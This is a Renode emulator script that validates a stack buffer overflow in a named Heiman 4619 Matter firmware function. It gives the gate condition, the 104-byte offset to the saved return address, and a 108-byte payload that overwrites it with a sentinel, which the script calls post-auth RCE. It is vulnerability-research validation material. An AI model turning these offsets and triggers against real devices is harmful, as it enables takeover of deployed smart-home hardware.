:name: MT-03 Heiman 4619 Matter sub_8008E9C stack overflow -> saved-LR -- validation
:description: Drives the sink caller sub_8008E9C of the real Heiman 4619 Matter firmware on the emulated EFR32MG24 and demonstrates the unbounded memcpy overwriting the saved return address (post-auth RCE).
#
# Bug (sub_8008E9C @0x8008E9C): PUSH{R4-R7,LR} (5 regs = 20B) + SUB SP,#0x7C.
# The 0xF000 gate at 0x8008ecc (BEQ taken iff R6==0xF000, R6 = src[0]|src[1]<<8)
# reaches the memcpy at 0x8008f06 (BL sub_809DFFA) with dst=SP_after_prologue+0x24,
# src=a2=r1, len=a3=r2 unclamped. dst->savedLR distance = 0x68 = 104 bytes, so
# len>=108 overwrites the saved LR (stored by PUSH at entry_SP-4).
#
# entry_SP = 0x20010000 => dst = 0x2000FF94, saved-LR slot = 0x2000FFFC.
# We Step 1 first so the prologue PUSH stores the legitimate LR (0x08001337) into
# the saved-LR slot (the BEFORE state), then Step to 500 total to complete the
# memcpy; PC lands at 0x8008f5a (still inside the function, before the epilogue),
# so the stack slot read is uncorrupted. The saved-LR slot then holds the
# attacker sentinel 0x20006E01.

$bin=@scripts/silabs-vuln/mt03_heiman.elf
include @scripts/silabs-vuln/boot_mg24.resc

emulation RunFor "0.4"
pause

# --- SRC buffer @0x20008000 (108 bytes). src[0..1]=00 F0 -> R6==0xF000 gate.
#     src[104..107] (offset 0x68) = 0x20006E01 sentinel -> lands on saved LR.
sysbus WriteDoubleWord 0x20008000 0x4141F000
sysbus WriteDoubleWord 0x20008004 0x41414141
sysbus WriteDoubleWord 0x20008008 0x41414141
sysbus WriteDoubleWord 0x2000800C 0x41414141
sysbus WriteDoubleWord 0x20008010 0x41414141
sysbus WriteDoubleWord 0x20008014 0x41414141
sysbus WriteDoubleWord 0x20008018 0x41414141
sysbus WriteDoubleWord 0x2000801C 0x41414141
sysbus WriteDoubleWord 0x20008020 0x41414141
sysbus WriteDoubleWord 0x20008024 0x41414141
sysbus WriteDoubleWord 0x20008028 0x41414141
sysbus WriteDoubleWord 0x2000802C 0x41414141
sysbus WriteDoubleWord 0x20008030 0x41414141
sysbus WriteDoubleWord 0x20008034 0x41414141
sysbus WriteDoubleWord 0x20008038 0x41414141
sysbus WriteDoubleWord 0x2000803C 0x41414141
sysbus WriteDoubleWord 0x20008040 0x41414141
sysbus WriteDoubleWord 0x20008044 0x41414141
sysbus WriteDoubleWord 0x20008048 0x41414141
sysbus WriteDoubleWord 0x2000804C 0x41414141
sysbus WriteDoubleWord 0x20008050 0x41414141
sysbus WriteDoubleWord 0x20008054 0x41414141
sysbus WriteDoubleWord 0x20008058 0x41414141
sysbus WriteDoubleWord 0x2000805C 0x41414141
sysbus WriteDoubleWord 0x20008060 0x41414141
sysbus WriteDoubleWord 0x20008064 0x41414141
sysbus WriteDoubleWord 0x20008068 0x20006E01

# --- Call contract: a1 not deref'd; a2=src; a3=len=108; SP=0x20010000; LR sentinel
sysbus.cpu SetRegister 0  0x20018681
sysbus.cpu SetRegister 1  0x20008000
sysbus.cpu SetRegister 2  0x0000006C
sysbus.cpu SetRegister 3  0x00000000
sysbus.cpu SetRegister 13 0x20010000
sysbus.cpu SetRegister 14 0x08001337
sysbus.cpu PC 0x8008E9C

# Execute the prologue PUSH {R4-R7,LR} so the legitimate saved LR is on the stack.
sysbus.cpu Step 1
echo ">>> BEFORE: saved-LR slot @0x2000FFFC (legit return addr, expect 0x08001337) ="
sysbus ReadDoubleWord 0x2000FFFC

# Run to 500 instructions total: through the gate and the whole 108-byte memcpy,
# stopping inside the function (PC ~0x8008f5a) before the epilogue pop.
sysbus.cpu Step 499

echo ">>> PC after stepping (still inside sub_8008E9C, before epilogue) ="
sysbus.cpu PC
echo ">>> AFTER: saved-LR slot @0x2000FFFC (overwritten, expect 0x20006E01) ="
sysbus ReadDoubleWord 0x2000FFFC
echo ">>> dst buffer start @0x2000FF94 (memcpy landed, expect 0x4141F000) ="
sysbus ReadDoubleWord 0x2000FF94
